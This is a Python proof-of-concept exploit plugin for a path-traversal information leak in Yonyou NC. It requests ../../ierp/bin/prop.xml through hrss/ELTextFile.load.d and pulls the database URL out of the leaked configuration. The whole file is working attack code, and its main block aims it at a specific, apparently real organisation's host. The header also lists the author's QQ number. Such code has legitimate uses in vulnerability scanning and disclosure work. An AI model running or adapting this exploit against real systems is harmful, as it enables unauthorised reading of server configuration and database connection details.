#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  用友NC /hrss/ELTextFile.load.d 信息泄漏漏洞 POC
References:  http://wooyun.org/bugs/wooyun-2014-066512
Author    :  foxhack
QQ        :  278563291
"""

import  re


def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
    #print res
    if code == 200:
        security_hole(url + 'hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
    	m = re.search("enableHotDeploy",res) 
    	k = re.search("internalServiceArray",res)
        if m and k:
            security_hole(re.search("<databaseUrl>(.*?)</databaseUrl>",res).groups()[0])

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://ehr.jmlyp.com/')[1])